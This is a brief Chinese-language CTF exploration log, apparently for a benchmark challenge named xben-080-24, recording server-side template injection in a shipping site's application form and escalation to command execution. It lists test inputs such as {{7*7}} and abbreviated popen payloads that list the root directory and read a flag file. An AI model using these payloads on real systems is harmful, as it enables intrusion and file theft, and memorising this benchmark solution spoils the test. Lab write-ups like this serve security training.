# xben-080-24 · 探索记录

对应题解：[`xben-080-24.md`](./xben-080-24.md)

## 目标与起点

`10.0.172.217:80`，Swift Shipping，`/application` 表单 → `/submit`。

## 第一阶段：确认 SSTI

| name | 结果 |
| --- | --- |
| `John` | `Thank you John ...` |
| `{{7*7}}` | `Thank you 49 ...` |

## 第二阶段：RCE

| payload | 结果 |
| --- | --- |
| `...popen('ls /').read()` | `FLAG.txt` |
| `...popen('cat /FLAG.txt').read()` | **flag** |

## 这次真正的收获

回显字段的模板注入比通常的 URL 参数更隐蔽（在 POST 里），但定性方法一样。
